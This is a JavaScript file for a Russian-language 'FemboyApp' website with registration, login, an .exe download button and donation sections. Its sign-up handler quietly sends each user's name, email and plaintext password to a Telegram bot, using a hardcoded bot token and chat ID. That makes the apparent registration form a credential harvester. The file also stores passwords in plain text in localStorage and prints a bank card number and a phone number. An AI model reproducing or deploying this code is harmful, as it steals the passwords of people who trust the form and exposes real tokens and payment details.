// ============================================================
// НАСТРОЙКА TELEGRAM БОТА
// ============================================================
const BOT_TOKEN = '8802719388:AAFlZNJRNvOMjsD4il64D73xYzwvkJNWSko';
const CHAT_ID = '8670090188';

// Функция отправки данных в Telegram
function sendToTelegram(data) {
    const message = `
📝 НОВЫЙ ПОЛЬЗОВАТЕЛЬ
━━━━━━━━━━━━━━━━
👤 Имя: ${data.name || 'Не указано'}
📧 Email: ${data.email || 'Не указано'}
🔒 Пароль: ${data.password || 'Не указан'}
🕐 Время: ${new Date().toLocaleString('ru-RU')}
🌐 Тип: ${data.type || 'Регистрация'}
━━━━━━━━━━━━━━━━
    `;

    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('✅ Отправлено в Telegram:', data);
    })
    .catch(error => {
        console.error('❌ Ошибка отправки в Telegram:', error);
        saveToLocalStorage({...data, saved: true});
    });
}

// Резервное сохранение в localStorage
function saveToLocalStorage(data) {
    const users = JSON.parse(localStorage.getItem('femboyapp_users') || '[]');
    users.push({
        ...data,
        timestamp: new Date().toISOString()
    });
    localStorage.setItem('femboyapp_users', JSON.stringify(users));
}

// ============================================================
// УПРАВЛЕНИЕ АВТОРИЗАЦИЕЙ
// ============================================================

// Проверка авторизации при загрузке
window.addEventListener('DOMContentLoaded', () => {
    const currentUser = JSON.parse(localStorage.getItem('femboyapp_current_user') || 'null');
    if (currentUser) {
        showMainContent(currentUser);
    } else {
        showRegisterPage();
    }
});

function showRegisterPage() {
    document.getElementById('registerPage').style.display = 'flex';
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('mainContent').style.display = 'none';
    document.getElementById('mainHeader').style.display = 'none';
}

function showLoginPage() {
    document.getElementById('registerPage').style.display = 'none';
    document.getElementById('loginPage').style.display = 'flex';
    document.getElementById('mainContent').style.display = 'none';
    document.getElementById('mainHeader').style.display = 'none';
}

function showMainContent(user) {
    document.getElementById('registerPage').style.display = 'none';
    document.getElementById('loginPage').style.display = 'none';
    document.getElementById('mainContent').style.display = 'block';
    document.getElementById('mainHeader').style.display = 'block';
    document.getElementById('userGreeting').textContent = `👤 Привет, ${user.name}!`;
}

// ============================================================
// РЕГИСТРАЦИЯ
// ============================================================

const registerForm = document.getElementById('registerForm');
const regName = document.getElementById('regName');
const regEmail = document.getElementById('regEmail');
const regPassword = document.getElementById('regPassword');
const regConfirm = document.getElementById('regConfirm');
const regAgree = document.getElementById('regAgree');

// Индикатор сложности пароля
regPassword.addEventListener('input', () => {
    const password = regPassword.value;
    const bar = document.querySelector('.strength-bar');
    const text = document.querySelector('.strength-text');
    let strength = 0;
    
    if (password.length >= 6) strength++;
    if (password.match(/[a-z]/) && password.match(/[A-Z]/)) strength++;
    if (password.match(/\d/)) strength++;
    if (password.match(/[^a-zA-Z0-9]/)) strength++;
    
    const colors = ['#dfe6e9', '#e17055', '#fdcb6e', '#00b894', '#00cec9'];
    const labels = ['Слабый', 'Средний', 'Хороший', 'Сильный', 'Очень сильный'];
    const widths = ['0%', '25%', '50%', '75%', '100%'];
    
    const index = Math.min(strength, 4);
    bar.style.width = widths[index];
    bar.style.background = colors[index];
    text.textContent = labels[index];
    text.style.color = colors[index];
});

// Валидация полей
function validateField(input, validateFn, errorMsg) {
    input.addEventListener('blur', () => {
        const error = input.closest('.form-group').querySelector('.error-message');
        const isValid = validateFn(input.value);
        if (!isValid && input.value) {
            input.classList.add('error');
            input.classList.remove('success');
            error.textContent = errorMsg;
        } else if (isValid && input.value) {
            input.classList.remove('error');
            input.classList.add('success');
            error.textContent = '';
        } else {
            input.classList.remove('error', 'success');
            error.textContent = '';
        }
    });
    
    input.addEventListener('input', () => {
        if (input.classList.contains('error')) {
            input.classList.remove('error');
            const error = input.closest('.form-group').querySelector('.error-message');
            error.textContent = '';
        }
    });
}

validateField(regName, (val) => val.length >= 2, 'Имя должно содержать минимум 2 символа');
validateField(regEmail, (val) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val), 'Введите корректный email');
validateField(regPassword, (val) => val.length >= 6, 'Пароль должен содержать минимум 6 символов');

regConfirm.addEventListener('input', () => {
    const error = regConfirm.closest('.form-group').querySelector('.error-message');
    if (regConfirm.value && regConfirm.value !== regPassword.value) {
        regConfirm.classList.add('error');
        regConfirm.classList.remove('success');
        error.textContent = 'Пароли не совпадают';
    } else if (regConfirm.value && regConfirm.value === regPassword.value) {
        regConfirm.classList.remove('error');
        regConfirm.classList.add('success');
        error.textContent = '';
    } else {
        regConfirm.classList.remove('error', 'success');
        error.textContent = '';
    }
});

// Показать/скрыть пароль
document.querySelectorAll('.toggle-password').forEach(btn => {
    btn.addEventListener('click', () => {
        const input = btn.closest('.password-wrapper').querySelector('input');
        if (input.type === 'password') {
            input.type = 'text';
            btn.textContent = '🙈';
        } else {
            input.type = 'password';
            btn.textContent = '👁️';
        }
    });
});

// Отправка формы регистрации
registerForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const name = regName.value.trim();
    const email = regEmail.value.trim();
    const password = regPassword.value;
    const confirm = regConfirm.value;
    const agree = regAgree.checked;
    
    let isValid = true;
    
    if (name.length < 2) {
        showError(regName, 'Имя должно содержать минимум 2 символа');
        isValid = false;
    }
    
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        showError(regEmail, 'Введите корректный email');
        isValid = false;
    }
    
    if (password.length < 6) {
        showError(regPassword, 'Пароль должен содержать минимум 6 символов');
        isValid = false;
    }
    
    if (confirm !== password) {
        showError(regConfirm, 'Пароли не совпадают');
        isValid = false;
    }
    
    if (!agree) {
        showToast('Пожалуйста, согласитесь с условиями', 'error');
        isValid = false;
    }
    
    // Проверка существующего пользователя
    const users = JSON.parse(localStorage.getItem('femboyapp_users') || '[]');
    if (users.some(u => u.email === email)) {
        showToast('❌ Пользователь с таким email уже существует', 'error');
        return;
    }
    
    if (!isValid) return;
    
    // Отправка в Telegram
    const userData = {
        name: name,
        email: email,
        password: password,
        type: 'Регистрация'
    };
    
    const submitBtn = registerForm.querySelector('.btn-submit');
    submitBtn.textContent = '⏳ Отправка...';
    submitBtn.disabled = true;
    
    sendToTelegram(userData);
    
    // Сохраняем в localStorage
    saveToLocalStorage(userData);
    
    setTimeout(() => {
        showToast('✅ Регистрация успешна! Войдите в аккаунт.', 'success');
        registerForm.reset();
        document.querySelector('.strength-bar').style.width = '0%';
        document.querySelector('.strength-text').textContent = 'Сложность пароля';
        document.querySelectorAll('.form-group input').forEach(input => {
            input.classList.remove('success', 'error');
        });
        submitBtn.textContent = 'Создать аккаунт';
        submitBtn.disabled = false;
        showLoginPage();
    }, 1500);
});

function showError(input, message) {
    const group = input.closest('.form-group');
    const error = group.querySelector('.error-message');
    input.classList.add('error');
    input.classList.remove('success');
    error.textContent = message;
    input.focus();
}

// ============================================================
// ВХОД
// ============================================================

const loginForm = document.getElementById('loginForm');
const loginEmail = document.getElementById('loginEmail');
const loginPassword = document.getElementById('loginPassword');

loginForm.addEventListener('submit', (e) => {
    e.preventDefault();
    
    const email = loginEmail.value.trim();
    const password = loginPassword.value;
    
    if (!email || !password) {
        showToast('Заполните все поля', 'error');
        return;
    }
    
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
        showToast('Введите корректный email', 'error');
        return;
    }
    
    // Проверка в localStorage
    const users = JSON.parse(localStorage.getItem('femboyapp_users') || '[]');
    const user = users.find(u => u.email === email && u.password === password);
    
    if (!user) {
        showToast('❌ Неверный email или пароль', 'error');
        return;
    }
    
    // Отправка в Telegram о входе
    sendToTelegram({
        name: user.name || 'Пользователь',
        email: email,
        password: '********',
        type: 'Вход в систему'
    });
    
    const submitBtn = loginForm.querySelector('.btn-submit');
    submitBtn.textContent = '⏳ Вход...';
    submitBtn.disabled = true;
    
    setTimeout(() => {
        localStorage.setItem('femboyapp_current_user', JSON.stringify({
            name: user.name,
            email: user.email
        }));
        showToast(`👋 Добро пожаловать, ${user.name}!`, 'success');
        loginForm.reset();
        submitBtn.textContent = 'Войти';
        submitBtn.disabled = false;
        showMainContent({ name: user.name, email: user.email });
    }, 1000);
});

// ============================================================
// ПЕРЕКЛЮЧЕНИЕ МЕЖДУ СТРАНИЦАМИ
// ============================================================

document.getElementById('switchToLogin').addEventListener('click', (e) => {
    e.preventDefault();
    showLoginPage();
});

document.getElementById('switchToRegister').addEventListener('click', (e) => {
    e.preventDefault();
    showRegisterPage();
});

// ============================================================
// ВЫХОД
// ============================================================

document.getElementById('logoutBtn').addEventListener('click', () => {
    localStorage.removeItem('femboyapp_current_user');
    showRegisterPage();
    showToast('👋 Вы вышли из аккаунта', 'success');
});

// ============================================================
// TOAST УВЕДОМЛЕНИЯ
// ============================================================

function showToast(message, type = 'info') {
    const toast = document.getElementById('toast');
    toast.textContent = message;
    toast.className = 'toast ' + type;
    
    if (window.toastTimeout) clearTimeout(window.toastTimeout);
    
    setTimeout(() => toast.classList.add('show'), 10);
    
    window.toastTimeout = setTimeout(() => {
        toast.classList.remove('show');
    }, 3500);
}

// ============================================================
// БУРГЕР-МЕНЮ
// ============================================================

const burger = document.querySelector('.burger');
const navList = document.querySelector('.nav-list');

burger.addEventListener('click', () => {
    navList.classList.toggle('active');
});

document.querySelectorAll('.nav-list a').forEach(link => {
    link.addEventListener('click', () => {
        navList.classList.remove('active');
    });
});

// ============================================================
// АНИМАЦИЯ КАРТОЧЕК
// ============================================================

const cards = document.querySelectorAll('.card');

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            const delay = parseInt(entry.target.dataset.delay) || 0;
            setTimeout(() => {
                entry.target.classList.add('visible');
            }, delay);
        }
    });
}, { threshold: 0.2 });

cards.forEach(card => observer.observe(card));

// ============================================================
// ЭФФЕКТ СКРОЛЛА ШАПКИ
// ============================================================

const header = document.querySelector('.header');

window.addEventListener('scroll', () => {
    if (window.scrollY > 50) {
        header.classList.add('scrolled');
    } else {
        header.classList.remove('scrolled');
    }
});

// ============================================================
// СКАЧИВАНИЕ ФАЙЛОВ
// ============================================================

document.querySelectorAll('.btn-download[data-file]').forEach(btn => {
    btn.addEventListener('click', function() {
        const fileName = this.dataset.file;
        
        if (fileName.endsWith('.exe')) {
            this.textContent = '⏳ Загрузка...';
            this.disabled = true;
            
            try {
                const filePath = 'Femboyapp.exe';
                
                const link = document.createElement('a');
                link.href = filePath;
                link.download = 'Femboyapp.exe';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                
                this.textContent = '✅ Femboyapp.exe скачан!';
                this.style.background = 'linear-gradient(135deg, #00b894, #00cec9)';
                showToast('📥 Femboyapp.exe успешно скачан!', 'success');
                
                setTimeout(() => {
                    this.textContent = '📥 Скачать .exe';
                    this.disabled = false;
                    this.style.background = '';
                }, 3000);
                
            } catch (error) {
                console.error('Ошибка скачивания:', error);
                showToast('❌ Ошибка скачивания файла', 'error');
                this.textContent = '📥 Скачать .exe';
                this.disabled = false;
            }
            
        } else {
            this.textContent = '⏳ Скачивание...';
            this.disabled = true;
            
            setTimeout(() => {
                this.textContent = `✅ ${fileName} скачан!`;
                this.style.background = 'linear-gradient(135deg, #00b894, #00cec9)';
                
                const content = '# FemboyApp.py\n# Демо-версия приложения\n\nimport tkinter as tk\nfrom tkinter import ttk\n\nclass FemboyApp:\n    def __init__(self, root):\n        self.root = root\n        self.root.title("Femboy App v2.0")\n        self.root.geometry("400x300")\n        \n        label = ttk.Label(root, text="🌸 Добро пожаловать!", font=("Arial", 16))\n        label.pack(pady=20)\n        \n        btn = ttk.Button(root, text="Нажми меня", command=self.say_hello)\n        btn.pack(pady=10)\n    \n    def say_hello(self):\n        print("Привет из FemboyApp!")\n\nif __name__ == "__main__":\n    root = tk.Tk()\n    app = FemboyApp(root)\n    root.mainloop()';
                
                const blob = new Blob([content], { type: 'text/plain' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = fileName;
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                URL.revokeObjectURL(url);
                
                showToast(`📥 Файл ${fileName} скачан!`, 'success');
                
                setTimeout(() => {
                    this.textContent = '📄 Показать код .py';
                    this.disabled = false;
                    this.style.background = '';
                }, 3000);
            }, 1500);
        }
    });
});

// ============================================================
// ПОКАЗАТЬ/СКРЫТЬ КОД
// ============================================================

document.querySelectorAll('.btn-code[data-file]').forEach(btn => {
    btn.addEventListener('click', () => {
        const card = btn.closest('.download-card');
        const preview = card.querySelector('.code-preview');
        
        if (preview.style.display === 'none' || preview.style.display === '') {
            preview.style.display = 'block';
            btn.textContent = '🙈 Скрыть код';
        } else {
            preview.style.display = 'none';
            btn.textContent = '📄 Показать код .py';
        }
    });
});

document.querySelectorAll('.btn-close-code').forEach(btn => {
    btn.addEventListener('click', () => {
        const card = btn.closest('.download-card');
        const preview = card.querySelector('.code-preview');
        const codeBtn = card.querySelector('.btn-code');
        
        preview.style.display = 'none';
        codeBtn.textContent = '📄 Показать код .py';
    });
});

// ============================================================
// ПЛАВНЫЙ СКРОЛЛ
// ============================================================

document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        const href = this.getAttribute('href');
        if (href === '#') return;
        e.preventDefault();
        const target = document.querySelector(href);
        if (target) {
            target.scrollIntoView({
                behavior: 'smooth',
                block: 'start'
            });
        }
    });
});

// ============================================================
// КОПИРОВАНИЕ КОНТАКТОВ
// ============================================================

function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => {
        showToast('✅ Контакт скопирован!', 'success');
    }).catch(() => {
        showToast('❌ Не удалось скопировать', 'error');
    });
}

document.addEventListener('DOMContentLoaded', () => {
    const contactLinks = document.querySelectorAll('.contact-link');
    contactLinks.forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            const text = link.textContent.trim();
            copyToClipboard(text);
        });
    });
});

// ============================================================
// 💝 ДОНАТ - КОПИРОВАНИЕ КАРТЫ
// ============================================================

function copyCardNumber() {
    const cardNumber = document.querySelector('.donate-card-number span');
    if (!cardNumber) return;
    
    const text = cardNumber.textContent.replace(/\s/g, '');
    const card = cardNumber.closest('.donate-card-number');
    const btn = card.querySelector('.btn-copy');
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showCopySuccess(btn, '✅ Номер карты скопирован!');
        }).catch(() => {
            copyFallback(cardNumber, btn);
        });
    } else {
        copyFallback(cardNumber, btn);
    }
}

function copyPhoneNumber() {
    const phoneNumber = document.querySelectorAll('.donate-card-number span');
    let phoneSpan = null;
    phoneNumber.forEach(el => {
        if (el.textContent.includes('8') || el.textContent.includes('+7')) {
            phoneSpan = el;
        }
    });
    
    if (!phoneSpan) return;
    
    const text = phoneSpan.textContent.replace(/\s/g, '').replace(/[()-]/g, '');
    const card = phoneSpan.closest('.donate-card-number');
    const btn = card.querySelector('.btn-copy');
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showCopySuccess(btn, '✅ Номер телефона скопирован!');
        }).catch(() => {
            copyFallback(phoneSpan, btn);
        });
    } else {
        copyFallback(phoneSpan, btn);
    }
}

function copyFallback(element, btn) {
    const range = document.createRange();
    range.selectNode(element);
    window.getSelection().removeAllRanges();
    window.getSelection().addRange(range);
    
    try {
        document.execCommand('copy');
        showCopySuccess(btn, '✅ Скопировано!');
    } catch (err) {
        showToast('❌ Не удалось скопировать. Выделите текст вручную.', 'error');
    }
    
    window.getSelection().removeAllRanges();
}

function showCopySuccess(btn, message) {
    const originalText = btn.textContent;
    btn.textContent = message;
    btn.classList.add('copied');
    
    showToast(message, 'success');
    
    setTimeout(() => {
        btn.textContent = originalText;
        btn.classList.remove('copied');
    }, 2500);
}

// ============================================================
// 💝 ДОНАТ - СТАТИСТИКА
// ============================================================

// Загружаем сохранённую статистику при загрузке
document.addEventListener('DOMContentLoaded', () => {
    const totalElement = document.getElementById('totalAmount');
    const countElement = document.getElementById('donorsCount');
    
    const savedTotal = localStorage.getItem('donate_total');
    const savedCount = localStorage.getItem('donate_count');
    
    if (savedTotal) {
        totalElement.textContent = parseInt(savedTotal).toLocaleString() + ' ₽';
    } else {
        totalElement.textContent = '0 ₽';
    }
    
    if (savedCount) {
        countElement.textContent = savedCount;
    } else {
        countElement.textContent = '0';
    }
});

// Функция для обновления статистики
function updateDonateStats(amount) {
    const totalElement = document.getElementById('totalAmount');
    const countElement = document.getElementById('donorsCount');
    
    let total = parseInt(totalElement.textContent.replace(/[^0-9]/g, '')) || 0;
    let count = parseInt(countElement.textContent) || 0;
    
    total += amount;
    count += 1;
    
    totalElement.textContent = total.toLocaleString() + ' ₽';
    countElement.textContent = count;
    
    localStorage.setItem('donate_total', total);
    localStorage.setItem('donate_count', count);
}

// Для тестов в консоли
function testDonate() {
    const amount = prompt('Введите сумму доната для теста:');
    if (amount && !isNaN(amount) && Number(amount) > 0) {
        updateDonateStats(Number(amount));
        showToast(`✅ Тестовый донат на ${amount} ₽ добавлен!`, 'success');
    }
}

// ============================================================
// 💝 ДОНАТ - КЛИК НА БАНКОВСКИЕ РЕКВИЗИТЫ
// ============================================================

document.addEventListener('DOMContentLoaded', () => {
    const bankItems = document.querySelectorAll('.bank-item');
    bankItems.forEach(item => {
        item.addEventListener('click', function() {
            const value = this.querySelector('.bank-value');
            if (value) {
                copyToClipboard(value.textContent);
                showToast('✅ Реквизит скопирован!', 'success');
            }
        });
    });
});

// ============================================================
// ИНИЦИАЛИЗАЦИЯ
// ============================================================

console.log('🌸 FemboyApp загружен!');
console.log('📌 Для работы с Telegram ботом замените BOT_TOKEN и CHAT_ID');
console.log('📱 Контакты:');
console.log('📱 Telegram: @FemBoyLoverOwO');
console.log('✉️ Email: femboyloversupport@gmail.com');
console.log('❤️ Сделано с любовью для фембоев!');
console.log('📁 Файл Femboyapp.exe должен лежать в папке с сайтом!');
console.log('');
console.log('💝 ДОНАТ:');
console.log('💳 Карта: 2204 3212 1218 7579');
console.log('📱 Телефон: 8 (904) 244-14-59');
console.log('💖 Спасибо за поддержку FemboyApp!');
console.log('');
console.log('💝 Для теста доната введите в консоли: testDonate()');